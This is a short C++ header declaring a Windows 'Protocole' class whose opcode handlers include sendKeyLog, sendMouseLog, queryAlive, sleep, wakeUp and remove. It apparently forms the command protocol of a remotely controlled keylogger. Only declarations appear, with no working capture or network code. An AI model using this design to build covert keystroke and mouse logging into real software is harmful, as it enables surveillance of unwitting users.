#pragma once

#include <windows.h>
#include <string>
#include "opcodemsg.h"

class Protocole
{
public:
	Protocole();
	~Protocole();

	t_msg			getStruct();
	void			setStruct(const t_msg msg);
	int				getOpCode() const;
	int				getTask() const;
	int				getId() const;
	int				analyze(const std::string);
	int				doSmth();
	std::string		getMsg();

private:
	int									_op_code;
	int									_task;
	int									_id;
	bool								_alive;
	t_msg								_smsg;
	std::string							_buffer;
	std::vector<int (Protocole::*)()>	 _tab;
	// 

public :
	int		whoAreYou();
	int		iAm();
	int		queryAlive();
	int		answerAlive();
	int		quit();
	int		sleep();
	int		wakeUp();
	int		remove();
	int		sendKeyLog();
	int		sendMouseLog();
	int		takeDatName();
	int		cmdNotFound();
};